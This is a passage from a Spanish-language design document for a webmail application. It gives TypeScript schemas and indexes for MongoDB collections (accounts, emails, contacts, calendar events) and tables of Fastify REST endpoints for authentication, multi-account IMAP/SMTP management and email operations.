    layout: 'three-pane' | 'list-only';  // default: 'three-pane'

    /** Si agrupar emails por conversación (threading) */
    enableThreading: boolean;   // default: true

    /** Si mostrar preview del email en la lista */
    showPreview: boolean;       // default: true

    /** Atajo de teclado preferido: gmail o outlook */
    keyboardShortcutSet: 'gmail' | 'outlook';  // default: 'gmail'

    /** Si el compositor usa formato HTML o texto plano */
    composeFormat: 'html' | 'text';  // default: 'html'

    /** Firma por defecto para emails salientes (puede contener HTML) */
    defaultSignature?: string;

    /** Si incluir firma por defecto */
    autoIncludeSignature: boolean;  // default: true

    /** Configuración de notificaciones */
    notifications: {
      /** Habilitar notificaciones push del navegador */
      desktopEnabled: boolean;   // default: true

      /** Sonido al recibir nuevo email */
      soundEnabled: boolean;     // default: false

      /** Notificar solo para emails de contactos conocidos */
      notifyOnlyContacts: boolean;  // default: false
    };

    /** Configuración de seguridad */
    security: {
      /** Si requiere confirmación antes de abrir links externos */
      confirmExternalLinks: boolean;  // default: true

      /** Si mostrar imágenes automáticamente (false = pedir confirmación) */
      autoLoadImages: boolean;   // default: false

      /** Si bloquear contenido de remitentes no en contactos */
      blockRemoteContentUnknown: boolean;  // default: true
    };
  };

  /** Fecha de creación del usuario en el sistema */
  createdAt: Date;

  /** Fecha de última modificación del perfil */
  updatedAt: Date;

  /** Fecha del último acceso exitoso */
  lastLoginAt?: Date;
}
```

El campo `preferences` se almacena como documento embebido porque todas las preferencias se cargan simultáneamente al iniciar sesión y rara vez cambian individualmente. No justifica una colección separada ni joins en runtime [^141^].

| Campo | Tipo | Índice | Descripción |
|-------|------|--------|-------------|
| `_id` | ObjectId | Primary | Identificador único del usuario |
| `primaryEmail` | string | Unique | Email principal para identificación |
| `displayName` | string | - | Nombre visible en la interfaz |
| `preferences.language` | string | - | Idioma de la UI (ISO 639-1) |
| `preferences.timezone` | string | - | Zona horaria IANA |
| `preferences.theme` | string | - | Tema: light, dark, system |
| `preferences.pageSize` | number | - | Emails por página (10-200) |
| `preferences.enableThreading` | boolean | - | Agrupar por conversación |
| `preferences.defaultSignature` | string | - | Firma HTML por defecto |
| `createdAt` | Date | TTL (2 años) | Fecha de creación |

**Índices:**
- `{primaryEmail: 1}` — unique, para lookup por email principal.
- `{createdAt: 1}` — TTL index de 2 años para cleanup de cuentas inactivas.

### 5.2 Colección `accounts` — Multi-Cuenta IMAP/SMTP

La colección `accounts` almacena la configuración de cada cuenta de correo vinculada a un usuario. El diseño soporta multi-cuenta desde el origen: un usuario puede tener múltiples accounts (Gmail personal, Exchange corporativo, IMAP propio), cada una con su propia configuración de servidor y credenciales encriptadas.

```typescript
interface IAccount {
  _id: ObjectId;

  /** Referencia al usuario propietario */
  userId: ObjectId;

  /** Nombre descriptivo de la cuenta (editable por el usuario) */
  name: string;

  /** Dirección de email completa */
  email: string;

  /** Si es la cuenta principal (por defecto para envío) */
  isPrimary: boolean;

  /** Configuración del servidor IMAP */
  imap: {
    /** Hostname del servidor IMAP */
    host: string;

    /** Puerto del servidor (143 o 993) */
    port: number;

    /** Si usar TLS desde el inicio (true para 993) */
    secure: boolean;

    /** Método de autenticación */
    authMethod: 'password' | 'oauth2';

    /** Username para autenticación IMAP */
    authUser: string;

    /**
     * Password encriptado con AES-256-GCM o token de acceso OAuth2.
     * El plugin mongoose-aes-encryption maneja encriptación transparente
     * a nivel de campo [^154^].
     */
    authCredentials: string;  // encrypted

    /** Si usar compresión IMAP (COMPRESS=DEFLATE) */
    compress: boolean;

    /** Extensiones soportadas por el servidor (detectadas en conexión) */
    capabilities?: string[];

    /** Si el servidor soporta CONDSTORE para sync incremental */
    hasCondstore?: boolean;

    /** Si el servidor soporta QRESYNC para re-sincronización rápida [^39^] */
    hasQresync?: boolean;

    /** Si el servidor soporta IMAP IDLE para notificaciones push [^63^] */
    hasIdle?: boolean;

    /** Protocolo preferido: imap o jmap (auto-detectado) */
    preferredProtocol: 'imap' | 'jmap';
  };

  /** Configuración del servidor SMTP para envío */
  smtp: {
    /** Hostname del servidor SMTP */
    host: string;

    /** Puerto (25, 587 con STARTTLS, o 465 con TLS) */
    port: number;

    /** Si usar TLS desde el inicio */
    secure: boolean;

    /** Método de autenticación */
    authMethod: 'password' | 'oauth2';

    /** Username para autenticación SMTP */
    authUser: string;

    /** Password encriptado o token OAuth2 */
    authCredentials: string;  // encrypted [^154^]
  };

  /** Configuración del servidor CalDAV (opcional) */
  caldav?: {
    /** URL base del servidor CalDAV */
    baseUrl: string;

    /** Username */
    username: string;

    /** Password encriptado */
    password: string;  // encrypted [^154^]
  };

  /** Estado de la cuenta */
  status: 'active' | 'syncing' | 'error' | 'disabled';

  /** Mensaje de error si status === 'error' */
  lastError?: string;

  /** Fecha de la última sincronización exitosa */
  lastSyncedAt?: Date;

  /** Fecha de creación de la cuenta */
  createdAt: Date;

  /** Fecha de última modificación */
  updatedAt: Date;
}
```

El campo `authCredentials` se encripta con AES-256-GCM usando el plugin mongoose-aes-encryption, que proporciona encriptación transparente: la aplicación lee y escribe valores en texto plano mientras solo ciphertext toca la base de datos [^154^]. Esta decisión es crítica para webmail, donde las credenciales de acceso a servidores de correo externo constituyen el activo más sensible del sistema. Incluso en caso de compromiso completo de la base de datos MongoDB, las credenciales permanecen protegadas siempre que la clave maestra `ENCRYPTION_KEY` (almacenada como variable de entorno del servidor) no se vea expuesta.

| Campo | Tipo | Índice | Descripción |
|-------|------|--------|-------------|
| `_id` | ObjectId | Primary | Identificador único de la cuenta |
| `userId` | ObjectId | Compound | FK a users._id |
| `email` | string | Unique | Dirección de email de la cuenta |
| `isPrimary` | boolean | - | Cuenta por defecto para envío |
| `imap.host` | string | - | Servidor IMAP |
| `imap.port` | number | - | Puerto IMAP |
| `imap.authMethod` | string | - | password u oauth2 |
| `imap.authCredentials` | string | Encrypted | Password/token encriptado [^154^] |
| `smtp.host` | string | - | Servidor SMTP |
| `status` | string | - | active, syncing, error, disabled |
| `lastSyncedAt` | Date | - | Última sincronización exitosa |

**Índices:**
- `{userId: 1, isPrimary: -1}` — para listar cuentas de un usuario con la primaria primero.
- `{email: 1}` — unique, para prevenir duplicados.
- `{status: 1, lastSyncedAt: 1}` — para queries de monitoreo de sincronización.

### 5.3 Colección `folders` — Cache Local IMAP

La colección `folders` mantiene un espejo de la jerarquía de carpetas IMAP para cada cuenta, permitiendo que el frontend muestre la estructura de buzones sin consultar el servidor IMAP en cada carga de página.

```typescript
interface IFolder {
  _id: ObjectId;

  /** Referencia a la cuenta */
  accountId: ObjectId;

  /** Nombre completo de la carpeta en el servidor IMAP */
  name: string;

  /** Delimitador de jerarquía (típicamente '.' o '/') */
  delimiter: string;

  /** Nombre para mostrar (último componente del path) */
  displayName: string;

  /** Path de la carpeta padre (vacío para root) */
  parentPath?: string;

  /** Flags especiales de IMAP */
  flags: string[];  // e.g., ['\\HasNoChildren', '\\Sent']

  /** Flag funcional especial (si aplica) */
  specialUse?: 'inbox' | 'sent' | 'drafts' | 'trash' | 'junk' | 'archive';

  /** UIDVALIDITY del servidor IMAP para esta carpeta */
  uidValidity: number;

  /** UIDNEXT esperado (para detectar mensajes nuevos) */
  uidNext: number;

  /** Número total de mensajes */
  totalMessages: number;

  /** Número de mensajes no leídos */
  unseenMessages: number;

  /** Si la carpeta está suscrita */
  subscribed: boolean;

  /** Orden de visualización configurable por el usuario */
  sortOrder: number;

  /** Si la carpeta está expandida en la UI */
  expanded: boolean;

  /** Fecha de última sincronización */
  syncedAt: Date;

  /** Fecha de creación del registro */
  createdAt: Date;

  /** Fecha de última modificación */
  updatedAt: Date;
}
```

Los campos `uidValidity` y `uidNext` son fundamentales para detectar condiciones de sincronización: si el `uidValidity` del servidor difiere del almacenado, todos los UIDs locales son inválidos y se requiere una sincronización completa. El campo `unseenMessages` se mantiene actualizado tanto por sincronización incremental como por notificaciones IDLE en tiempo real, permitiendo que el badge de "no leídos" en el sidebar se actualice sin recargar la página [^39^].

**Índices:**
- `{accountId: 1, sortOrder: 1}` — para listar carpetas ordenadas por usuario.
- `{accountId: 1, specialUse: 1}` — unique sparse, una carpeta especial por tipo por cuenta.

### 5.4 Colección `emails` — Cache Headers + Preview

La colección `emails` es el núcleo del sistema: almacena los headers, preview y metadata de cada mensaje, actuando como índice local que permite listar y buscar emails sin consultar el servidor IMAP. Los cuerpos completos **no** se almacenan aquí; se obtienen bajo demanda vía IMAP y se cachean en Redis [^70^][^75^].

```typescript
interface IEmail {
  _id: ObjectId;

  /** Referencia a la cuenta */
  accountId: ObjectId;

  /** Referencia a la carpeta */
  folderId: ObjectId;

  /** UID IMAP del mensaje (único dentro de la carpeta) */
  uid: number;

  /** Message-ID del RFC 822 (usado para threading) */
  messageId: string;

  /** Message-ID al que responde (para construir threads) */
  inReplyTo?: string;

  /** Array de Message-IDs referenciados (algoritmo JWZ) [^56^] */
  references?: string[];

  /** ID del thread (hash del Message-ID raíz, calculado por JWZ) */
  threadId?: string;

  /** Remitente parseado */
  from: {
    name?: string;
    address: string;
  };

  /** Destinatarios principales */
  to: {
    name?: string;
    address: string;
  }[];

  /** Destinatarios en copia */
  cc?: {
    name?: string;
    address: string;
  }[];

  /** Destinatarios en copia oculta (solo disponible para mensajes enviados) */
  bcc?: {
    name?: string;
    address: string;
  }[];

  /** Asunto del mensaje (decodificado RFC 2047) */
  subject: string;

  /** Fecha del mensaje (desde header Date) */
  date: Date;

  /** Fecha de recepción en el servidor IMAP */
  internalDate: Date;

  /** Tamaño total del mensaje en bytes */
  size: number;

  /** Preview de texto (primeros 200 caracteres del body plain) */
  preview?: string;

  /** Flags IMAP del mensaje */
  flags: {
    seen: boolean;      // \\Seen
    answered: boolean;  // \\Answered
    flagged: boolean;   // \\Flagged
    deleted: boolean;   // \\Deleted
    draft: boolean;     // \\Draft
  };

  /** Keywords personalizadas (Gmail labels, flags de usuario) */
  keywords?: string[];

  /** Si tiene adjuntos */
  hasAttachments: boolean;

  /** Número de adjuntos */
  attachmentCount: number;

  /** Modsequence para sync CONDSTORE */
  modseq?: number;

  /** Si el body ya fue cacheado en Redis */
  bodyCached: boolean;

  /** Fecha de cacheo del body */
  bodyCachedAt?: Date;

  /** Timestamp de creación del registro */
  createdAt: Date;

  /** Timestamp de última modificación */
  updatedAt: Date;
}
```

El diseño del índice compuesto principal sigue estrictamente la regla ESR (Equality → Sort → Range): los campos de igualdad (`accountId`, `folderId`) preceden al campo de ordenamiento (`date: -1`), que a su vez precede al campo de rango (`uid`) [^204^]. Esta estructura garantiza que la query más frecuente del sistema — "dame los emails de esta carpeta ordenados por fecha descendente" — se resuelva con un index scan monodireccional sin necesidad de in-memory sort ni fetch de documentos adicionales.

| Campo | Tipo | Índice | Descripción |
|-------|------|--------|-------------|
| `_id` | ObjectId | Primary | Identificador único |
| `accountId` | ObjectId | Compound (ESR) | FK a accounts._id |
| `folderId` | ObjectId | Compound (ESR) | FK a folders._id |
| `uid` | number | Compound (ESR) | UID IMAP |
| `messageId` | string | - | Message-ID RFC 822 |
| `threadId` | string | Compound | Hash del thread (JWZ) [^56^] |
| `from.address` | string | - | Email del remitente |
| `subject` | string | Atlas Search | Asunto decodificado |
| `date` | Date | Compound (ESR) | Fecha del header |
| `flags.seen` | boolean | Compound | Estado de lectura |
| `hasAttachments` | boolean | - | Tiene adjuntos |
| `modseq` | number | - | Para CONDSTORE sync |

**Índices:**
- `{accountId: 1, folderId: 1, date: -1, uid: 1}` — índice compuesto principal para listado [^204^].
- `{accountId: 1, threadId: 1, date: -1}` — para agrupar conversaciones.
- `{accountId: 1, flags.seen: 1, folderId: 1}` — para contar no leídos por carpeta.
- `{accountId: 1, "from.address": 1, date: -1}` — para listar emails por remitente.

Para búsqueda full-text sobre `subject`, `from.address` y `preview`, se utiliza MongoDB Atlas Search (basado en Apache Lucene), que ofrece sincronización automática de datos, highlighting, fuzzy search y autocomplete sin requerir infraestructura adicional [^132^]. Atlas Search cubre el 90% de los casos de uso de búsqueda en webmail y elimina la complejidad operacional de mantener un cluster Elasticsearch separado [^129^].

### 5.5 Colección `attachments` — Metadata

Los archivos adjuntos se almacenan físicamente en SeaweedFS (object storage S3-compatible con licencia Apache 2.0, optimizado para archivos pequeños y alto I/O) [^177^]. La colección `attachments` mantiene únicamente la metadata necesaria para localizar, nombrar y presentar los adjuntos en la interfaz.

```typescript
interface IAttachment {
  _id: ObjectId;

  /** Referencia al email que contiene el adjunto */
  emailId: ObjectId;

  /** Referencia a la cuenta */
  accountId: ObjectId;

  /** Nombre original del archivo */
  filename: string;

  /** MIME type (ej: application/pdf, image/png) */
  contentType: string;

  /** Tamaño en bytes */
  size: number;

  /** CID para adjuntos inline (Content-ID) */
  contentId?: string;

  /** Si es un adjunto inline (mostrado dentro del cuerpo HTML) */
  inline: boolean;

  /**
   * Clave de almacenamiento en SeaweedFS.
   * Formato: {accountId}/{emailUid}/{hash_filename}
   */
  storageKey: string;

  /** Checksum SHA-256 para verificación de integridad */
  checksum: string;

  /** Si está disponible para descarga/preview */
  available: boolean;

  /** Metadata de imágenes (si aplica) */
  imageMeta?: {
    width: number;
    height: number;
    thumbnailStorageKey?: string;
  };

  /** Timestamp de creación */
  createdAt: Date;
}
```

El `storageKey` sigue una convención jerárquica que facilita el listado y la limpieza: `{accountId}/{emailUid}/{hash}`. Cuando un email se elimina permanentemente, todos los adjuntos con su `emailId` se eliminan en cascada de SeaweedFS mediante un job de background en BullMQ [^203^].

**Índices:**
- `{emailId: 1}` — para listar adjuntos de un email.
- `{accountId: 1, createdAt: -1}` — para listar adjuntos recientes por cuenta.
- `{storageKey: 1}` — unique, para prevenir duplicados de almacenamiento.

### 5.6 Colección `contacts` — Agenda Básica

La colección `contacts` implementa una agenda de contactos integrada que puede sincronizarse bidireccionalmente con servidores CardDAV vía tsdav, la librería TypeScript más moderna y activa para CalDAV/CardDAV con ~113,580 descargas semanales en npm [^190^].

```typescript
interface IContact {
  _id: ObjectId;

  /** Referencia al usuario propietario */
  userId: ObjectId;

  /** Nombre completo del contacto */
  fullName: string;

  /** Nombre para ordenar (apellido, nombre) */
  sortName: string;

  /** Email principal */
  email: string;

  /** Emails adicionales */
  emails?: {
    label: string;      // 'work', 'home', 'other'
    address: string;
  }[];

  /** Teléfonos */
  phones?: {
    label: string;      // 'mobile', 'work', 'home', 'fax'
    number: string;
  }[];

  /** Organización */
  organization?: string;

  /** Cargo / título */
  jobTitle?: string;

  /** Notas */
  notes?: string;

  /** Dirección postal */
  address?: {
    street?: string;
    city?: string;
    state?: string;
    postalCode?: string;
    country?: string;
  };

  /** URL del sitio web */
  website?: string;

  /** Fecha de cumpleaños */
  birthday?: Date;

  /** URL del avatar o foto */
  photoUrl?: string;

  /** Si es un contacto frecuente (usado para autocomplete) */
  isFrequent: boolean;

  /** Contador de usos (emails enviados a este contacto) */
  usageCount: number;

  /** Origen del contacto: local, imported, carddav */
  source: 'local' | 'imported' | 'carddav';

  /** Si sincronizado con CardDAV: URL del recurso y ETag */
  carddavSync?: {
    resourceUrl: string;
    etag: string;
    lastSyncedAt: Date;
  };

  /** Fecha de creación */
  createdAt: Date;

  /** Fecha de última modificación */
  updatedAt: Date;
}
```

El campo `usageCount` se incrementa cada vez que el usuario envía un email al contacto, y se utiliza para ordenar las sugerencias de autocomplete en el compositor. Los contactos con `isFrequent: true` se cachean en Redis para respuestas de autocomplete sub-50ms.

**Índices:**
- `{userId: 1, sortName: 1}` — para listar contactos ordenados alfabéticamente.
- `{userId: 1, email: 1}` — unique sparse, para evitar duplicados por email.
- `{userId: 1, isFrequent: -1, usageCount: -1}` — para autocomplete de contactos frecuentes.
- `{userId: 1, "carddavSync.etag": 1}` — para sincronización incremental CardDAV.

### 5.7 Colección `drafts` — Auto-Save Local

Los borradores se almacenan exclusivamente en MongoDB sin sincronización con el servidor IMAP, facilitando un auto-guardado rápido y la gestión de múltiples borradores simultáneos.

```typescript
interface IDraft {
  _id: ObjectId;

  /** Referencia a la cuenta desde la que se enviará */
  accountId: ObjectId;

  /** Referencia al usuario */
  userId: ObjectId;

  /** Destinatarios principales */
  to: {
    name?: string;
    address: string;
  }[];

  /** Destinatarios en copia */
  cc?: {
    name?: string;
    address: string;
  }[];

  /** Destinatarios en copia oculta */
  bcc?: {
    name?: string;
    address: string;
  }[];

  /** Asunto */
  subject: string;

  /** Cuerpo del mensaje en HTML */
  bodyHtml?: string;

  /** Cuerpo del mensaje en texto plano */
  bodyText?: string;

  /** IDs de adjuntos temporales */
  attachments?: {
    filename: string;
    contentType: string;
    size: number;
    storageKey: string;
  }[];

  /** Headers In-Reply-To y References (si es respuesta) */
  replyTo?: {
    emailId: ObjectId;
    messageId: string;
    references: string[];
  };

  /** Si usar firma */
  includeSignature: boolean;

  /** Estado del borrador */
  status: 'editing' | 'sending' | 'sent' | 'failed';

  /** Fecha de última modificación (para auto-save) */
  lastModifiedAt: Date;

  /** Fecha de creación */
  createdAt: Date;
}
```

El campo `lastModifiedAt` tiene un índice TTL de 30 días: los drafts no modificados durante ese período se eliminan automáticamente por MongoDB, evitando acumulación de borradores abandonados.

**Índices:**
- `{accountId: 1, lastModifiedAt: -1}` — para listar drafts recientes.
- `{lastModifiedAt: 1}` — TTL index (30 días), expireAfterSeconds: 2592000.

### 5.8 Colección `events` — Calendario CalDAV

La colección `events` almacena los eventos de calendario sincronizados vía CalDAV (RFC 4791) usando tsdav como cliente [^190^]. El soporte de calendario es un requisito competitivo: los usuarios esperan aceptar o declinar invitaciones de reunión directamente desde su cliente de email, una funcionalidad que Roundcube solo logra mediante plugins descritos como "painful" de instalar [^131^][^225^].

```typescript
interface ICalendarEvent {
  _id: ObjectId;

  /** Referencia al usuario */
  userId: ObjectId;

  /** Referencia a la cuenta (puede diferir del userId para calendarios compartidos) */
  accountId: ObjectId;

  /** ID del calendario (colección CalDAV) */
  calendarId: string;

  /** Nombre del calendario */
  calendarName: string;

  /** Color asignado al calendario (hex) */
  calendarColor?: string;

  /** UID del evento iCalendar (RFC 5545) */
  uid: string;

  /** Título del evento */
  summary: string;

  /** Descripción */
  description?: string;

  /** Ubicación */
  location?: string;

  /** Sala de reuniones (campo específico de sistemas enterprise) */
  room?: string;

  /** Tipo de evento */
  eventType: 'event' | 'meeting' | 'reminder' | 'task';

  /** Fecha y hora de inicio */
  startDate: Date;

  /** Zona horaria de inicio (IANA tz database) */
  startTimezone: string;

  /** Fecha y hora de fin */
  endDate: Date;

  /** Zona horaria de fin */
  endTimezone: string;

  /** Si es un evento de día completo */
  allDay: boolean;

  /** Regla de recurrencia (RRULE en formato iCalendar) [^158^] */
  recurrenceRule?: string;

  /** Fechas excluidas de la recurrencia */
  recurrenceExceptions?: Date[];

  /** Organizador del evento */
  organizer?: {
    name?: string;
    email: string;
  };

  /** Asistentes invitados */
  attendees?: {
    name?: string;
    email: string;
    status: 'needs-action' | 'accepted' | 'declined' | 'tentative';
    role: 'chair' | 'required' | 'optional';
  }[];

  /** Estado de la invitación (si el usuario es asistente) */
  inviteStatus?: 'needs-action' | 'accepted' | 'declined' | 'tentative';

  /** Alarma / recordatorio */
  alarm?: {
    triggerMinutes: number;
    method: 'display' | 'email';
  };

  /** Si el evento proviene de un adjunto .ics en un email */
  sourceEmailId?: ObjectId;

  /** Datos de sincronización CalDAV */
  caldavSync?: {
    resourceUrl: string;
    etag: string;
    syncToken?: string;
    lastSyncedAt: Date;
  };

  /** Visibilidad del evento */
  visibility: 'default' | 'public' | 'private' | 'confidential';

  /** Estado del evento */
  status: 'confirmed' | 'tentative' | 'cancelled';

  /** Timestamp de creación local */
  createdAt: Date;

  /** Timestamp de última modificación local */
  updatedAt: Date;
}
```

El manejo de timezones es uno de los mayores desafíos en la integración de calendarios: las definiciones VTIMEZONE en archivos ICS son notoriamente problemáticas entre clientes, especialmente Outlook [^155^][^156^]. Webmail 6.0 adopta la recomendación de usar timezones de la base de datos IANA (tz database) y convertir a UTC cuando sea posible para almacenamiento interno, aplicando la zona horaria del usuario solo en el momento de renderizado [^155^].

La sincronización bidireccional con servidores CalDAV requiere manejo de conflictos mediante ETags para detección de cambios concurrentes, sync-tokens para sincronización incremental, y resolución a nivel de campo para minimizar pérdida de datos [^226^]. tsdav proporciona soporte integrado para estos mecanismos [^190^].

**Índices:**
- `{userId: 1, startDate: -1}` — para listar eventos próximos.
- `{accountId: 1, calendarId: 1, startDate: 1}` — para listar eventos por calendario en un rango.
- `{uid: 1}` — unique sparse, para evitar duplicados de evento.
- `{sourceEmailId: 1}` — para vincular eventos con emails de invitación.

### 5.9 Resumen de Estrategia de Indexado

La performance del webmail depende críticamente de que las queries más frecuentes se resuelvan como index-covered scans. La siguiente tabla consolida la estrategia de indexado por colección:

| Colección | Índice Principal | Campos Cubiertos | Complejidad de Query |
|-----------|-----------------|-----------------|---------------------|
| `users` | `{primaryEmail: 1}` | Login, lookup de perfil | O(1) |
| `accounts` | `{userId: 1, isPrimary: -1}` | Listar cuentas multi-inbox | O(n accounts) |
| `folders` | `{accountId: 1, sortOrder: 1}` | Sidebar de carpetas | O(n folders) |
| `emails` | `{accountId: 1, folderId: 1, date: -1, uid: 1}` | Listado de inbox [^204^] | O(log n) index scan |
| `emails` | `{accountId: 1, threadId: 1, date: -1}` | Conversaciones (JWZ) [^56^] | O(log n) index scan |
| `attachments` | `{emailId: 1}` | Listar adjuntos de un email | O(1) |
| `contacts` | `{userId: 1, isFrequent: -1, usageCount: -1}` | Autocomplete en compositor | O(log n) |
| `drafts` | `{accountId: 1, lastModifiedAt: -1}` | Listar borradores recientes | O(log n) |
| `events` | `{userId: 1, startDate: -1}` | Eventos próximos | O(log n) |

Para búsquedas full-text complejas — aquellas que escapan a los índices compuestos — MongoDB Atlas Search proporciona un motor basado en Apache Lucene integrado directamente en la base de datos, eliminando la necesidad de un cluster Elasticsearch separado y reduciendo el time-to-market en un 30-50% para proyectos greenfield [^132^]. Las capacidades de Atlas Search utilizadas por Webmail 6.0 incluyen: búsqueda de texto sobre `subject`, `from.address`, `to.address` y `preview`; filtrado por rango de fechas; highlighting de términos coincidentes; y fuzzy matching para corrección de typos en términos de búsqueda [^129^].


---

## 6. API REST Fastify

El API de Webmail 6.0 se implementa sobre Fastify 4, seleccionado por su rendimiento 2-3x superior a Express en benchmarks controlados (14,460 req/s vs 6,150 req/s bajo 100 conexiones concurrentes) y su sistema de plugins con encapsulación nativa que permite estructurar el webmail como módulos independientes sin filtración de middlewares entre rutas [^130^][^128^]. Cada dominio funcional — autenticación, cuentas IMAP, emails, carpetas, composición, adjuntos, contactos y calendario — se implementa como un plugin Fastify con su propio prefix, decorators, hooks y handlers, siguiendo la guía oficial de plugins de Fastify que promueve la composición de aplicaciones complejas a partir de módulos encapsulados [^149^].

La serialización de respuestas utiliza `fast-json-stringify`, que puede ser hasta 2x más rápido que `JSON.stringify` nativo gracias a la compilación de schemas de validación en funciones de serialización optimizadas [^130^]. El router `find-my-way` (trie-based) ofrece aproximadamente 3x el rendimiento del router de Express, lo que resulta crítico para endpoints de alta frecuencia como el listado de emails y las operaciones de auto-save de drafts [^130^].

Todas las rutas protegidas requieren un access token JWT válido en el header `Authorization: Bearer <token>`, con excepción de los endpoints de autenticación. El sistema implementa rate limiting mediante el algoritmo Sliding Window con Redis Sorted Sets (ZSET), que ofrece la mejor precisión para APIs de producción al eliminar el "burst effect" de los límites de ventana fija [^156^][^158^].

### 6.1 Autenticación

El módulo de autenticación implementa el patrón BFF (Backend-for-Frontend) con token rotation, donde el access token se almacena en memoria del frontend y el refresh token se entrega como cookie HTTP-only con atributos `Secure` y `SameSite: Strict` [^157^][^160^]. Redis actúa como store para los refresh tokens, aprovechando su soporte nativo de expiración (SETEX con TTL) para invalidación automática [^157^].

| Método | Path | Descripción | Body Params | Query Params |
|--------|------|-------------|-------------|--------------|
| `POST` | `/api/auth/login` | Valida credenciales IMAP y emite tokens JWT | `email: string`, `password: string`, `imapHost?: string`, `imapPort?: number`, `imapSecure?: boolean` | — |
| `POST` | `/api/auth/logout` | Revoca el refresh token y cierra conexiones IMAP | — | — |
| `GET` | `/api/auth/me` | Devuelve el usuario autenticado y sus cuentas vinculadas | — | — |
| `POST` | `/api/auth/refresh` | Emite un nuevo access token usando el refresh token (cookie) | — | — |
| `POST` | `/api/auth/oauth/init` | Inicia flujo OAuth2 para Gmail/Microsoft | `provider: 'gmail' \| 'microsoft'` | — |
| `POST` | `/api/auth/oauth/callback` | Completa flujo OAuth2 e intercambia code por token | `code: string`, `provider: 'gmail' \| 'microsoft'` | — |

**Ejemplo de request/response para login:**

```typescript
// Request POST /api/auth/login
{
  "email": "usuario@ejemplo.com",
  "password": "contraseña_segura",
  "imapHost": "imap.ejemplo.com",
  "imapPort": 993,
  "imapSecure": true
}

// Response 200 OK
{
  "accessToken": "eyJhbGciOiJIUzI1NiIs...",
  "expiresIn": 900,
  "user": {
    "id": "507f1f77bcf86cd799439011",
    "primaryEmail": "usuario@ejemplo.com",
    "displayName": "Usuario Ejemplo"
  },
  "accounts": [
    {
      "id": "507f1f77bcf86cd799439012",
      "email": "usuario@ejemplo.com",
      "name": "Principal",
      "isPrimary": true,
      "status": "active"
    }
  ]
}
```

El endpoint `POST /api/auth/login` ejecuta una conexión IMAP transitoria mediante imapflow para validar las credenciales contra el servidor real antes de emitir tokens. Esta decisión elimina la necesidad de mantener una tabla de passwords local y garantiza que el usuario tiene acceso activo a su cuenta de correo en el momento del login [^1^].

La rotación de refresh tokens implementa un `tokenRegistry` en Redis que trackea el estado de cada token (Token ID, Family ID, Previous Token hash, Revocation Status). Si se detecta reúso de un token revocado, se revoca toda la familia de tokens y se fuerza re-autenticación [^157^].

### 6.2 Cuentas

El módulo de cuentas gestiona la configuración multi-inbox, permitiendo a un usuario vincular múltiples servidores de correo (Gmail personal, Exchange corporativo, IMAP propio) con sincronización independiente por cuenta.

| Método | Path | Descripción | Body Params | Query Params |
|--------|------|-------------|-------------|--------------|
| `GET` | `/api/accounts` | Lista todas las cuentas del usuario autenticado | — | — |
| `GET` | `/api/accounts/:id` | Obtiene detalle de una cuenta específica | — | — |
| `POST` | `/api/accounts` | Añade una nueva cuenta IMAP/SMTP | `name: string`, `email: string`, `imap: ImapConfig`, `smtp: SmtpConfig`, `isPrimary?: boolean` | — |
| `PATCH` | `/api/accounts/:id` | Actualiza configuración de una cuenta | `name?: string`, `imap?: Partial<ImapConfig>`, `smtp?: Partial<SmtpConfig>` | — |
| `DELETE` | `/api/accounts/:id` | Elimina una cuenta y todos sus datos locales | — | — |
| `POST` | `/api/accounts/:id/sync` | Fuerza sincronización completa de la cuenta | — | `full?: boolean` (default: false) |
| `GET` | `/api/accounts/:id/status` | Devuelve estado de sincronización y health check | — | — |
| `POST` | `/api/accounts/:id/test` | Verifica conectividad IMAP/SMTP sin guardar | `imap: ImapConfig`, `smtp: SmtpConfig` | — |

**Ejemplo de schemas TypeScript para configuración:**

```typescript
interface ImapConfig {
  host: string;
  port: number;
  secure: boolean;
  authMethod: 'password' | 'oauth2';
  authUser: string;
  authCredentials: string;  // se encripta antes de almacenar [^154^]
  compress?: boolean;
}

interface SmtpConfig {
  host: string;
  port: number;
  secure: boolean;
  authMethod: 'password' | 'oauth2';
  authUser: string;
  authCredentials: string;  // se encripta antes de almacenar [^154^]
}
```

El endpoint `POST /api/accounts/:id/sync` encola un job de sincronización en BullMQ para procesamiento en background. Cuando `full=true`, se invalida el `uidValidity` cacheado y se ejecuta una sincronización completa desde cero; cuando `full=false` (default), se utiliza CONDSTORE o QRESYNC para una sincronización incremental que solo descarga mensajes nuevos o modificados desde la última sync [^39^]. BullMQ gestiona retries con exponential backoff ante fallos transitorios de red y dead letter queues para mensajes que no pueden procesarse tras múltiples intentos [^203^].

### 6.3 Emails

El módulo de emails implementa el patrón *headers-first, body-on-demand*: el listado opera contra MongoDB local mientras que los cuerpos se obtienen vía IMAP bajo demanda y se cachean en Redis con TTL de 1 hora [^70^][^75^].

| Método | Path | Descripción | Body Params | Query Params |
|--------|------|-------------|-------------|--------------|
| `GET` | `/api/accounts/:accountId/emails` | Lista emails de una carpeta (desde MongoDB) | — | `folderId: string`, `page?: number`, `limit?: number` (default: 50), `sort?: 'date' \| 'subject' \| 'from'` (default: 'date'), `order?: 'asc' \| 'desc'` (default: 'desc'), `query?: string` (búsqueda Atlas Search) |
| `GET` | `/api/accounts/:accountId/emails/:id` | Obtiene headers y metadata de un email | — | — |
| `GET` | `/api/accounts/:accountId/emails/:id/body` | Obtiene cuerpo HTML/texto (IMAP on-demand → Redis cache) | — | `format?: 'html' \| 'text' \| 'both'` (default: 'both') |
| `GET` | `/api/accounts/:accountId/emails/:id/raw` | Descarga el mensaje completo en formato RFC 822 (.eml) | — | — |
| `PATCH` | `/api/accounts/:accountId/emails/:id/flags` | Actualiza flags IMAP (\\Seen, \\Flagged, etc.) | `flags: { seen?: boolean, answered?: boolean, flagged?: boolean, deleted?: boolean }` | — |
| `POST` | `/api/accounts/:accountId/emails/:id/move` | Mueve email a otra carpeta | `targetFolderId: string` | — |
| `POST` | `/api/accounts/:accountId/emails/:id/copy` | Copia email a otra carpeta | `targetFolderId: string` | — |
| `DELETE` | `/api/accounts/:accountId/emails/:id` | Elimina email (mueve a Trash o expurga) | — | `permanent?: boolean` (default: false) |
| `POST` | `/api/accounts/:accountId/emails/batch` | Operaciones batch sobre múltiples emails | `operation: 'move' \| 'delete' \| 'setFlags'`, `emailIds: string[]`, `targetFolderId?: string`, `flags?: Partial<EmailFlags>` | — |
| `GET` | `/api/accounts/:accountId/emails/:id/thread` | Obtiene todos los emails del mismo hilo/conversación | — | — |

**Ejemplo de response para listado de emails:**

```typescript
// Response GET /api/accounts/:accountId/emails?folderId=xxx&limit=50
{
  "emails": [
    {
      "id": "507f1f77bcf86cd799439020",
